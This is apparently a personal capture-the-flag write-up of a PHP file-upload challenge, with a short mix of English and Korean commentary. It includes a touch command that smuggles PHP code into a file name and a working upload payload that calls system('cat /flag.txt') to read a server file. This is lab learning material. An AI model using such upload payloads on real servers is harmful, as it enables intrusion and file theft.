---
title: "image-storage"
description: ""
date: 2024-06-27
draft: false
starred: false
tags: ["hacking", "web-hacking"]
comments: false
---

![스크린샷 2024-06-28 171514.png](/assets/content/blog/image-storage/screenshot_2024-06-28_171514.png)

```
php로 작성된 파일 저장 서비스입니다.
파일 업로드 취약점을 이용해 플래그를 획득하세요. 플래그는 /flag.txt에 있습니다.
```

maybe directory traversing using `../../../../` but there’s this.

```php
<?php
    $directory = './uploads/';
    $scanned_directory = array_diff(scandir($directory), array('..', '.', 'index.html'));
    foreach ($scanned_directory as $key => $value) {
        echo "<li><a href='{$directory}{$value}'>".$value."</a></li><br/>";
    }
?>
```

- `scandir()` : List files and directories inside the images directory.

```php
Array
(
[0] => .
[1] => ..
[2] => cat.gif
[3] => dog.gif
[4] => horse.gif
[5] => myimages
)
```

- `array_diff` : eliminate elements in the array that’s also in the other array(s).

Therefore, there’s filter for `..` , `.` , `index.html`

그래서 `$value` 에 upload 할 파일명을 특수하게 만들어 php code 를 어떻게 해서든 넣어보려 했으나 실패했다. (사이트에 아무 변화도 없었음.)

```bash
touch "'><?php echo fgets(fopen('%2Fflag.txt', 'r')); ?>%2F%2F"
```

## ㅎㅎ…

If you check the uploaded files in the list.php page, you can find out that the contents of the file is just returned without any filtering process.

JUST ADD PHP CODE IN THE FILE!

```php
<?php
    system('cat /flag.txt');
?>
```

And then just click the link to the file!

🚩
